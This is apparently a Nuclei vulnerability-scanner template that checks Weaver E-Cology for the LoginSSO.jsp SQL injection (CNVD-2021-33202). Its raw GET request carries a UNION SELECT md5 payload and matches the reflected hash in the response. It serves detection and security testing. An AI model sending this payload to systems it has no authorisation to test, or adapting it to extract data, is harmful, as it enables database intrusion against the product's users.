id: weaver-e_cology-sql-injection-cnvd-2021-33202
info:
  name: Weaver E-Cology LoginSSO SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Weaver E-Cology LoginSSO.jsp endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20LoginSSO.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-33202.html

variables:
  rand: "{{rand_int(200000000, 220000000)}}"

http:
  - raw:
      - |
        GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20md5({{rand}})%20as%20id%20from%20HrmResourceManager HTTP/1.1
        Host: {{Hostname}}
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{md5(rand)}}"
        part: body
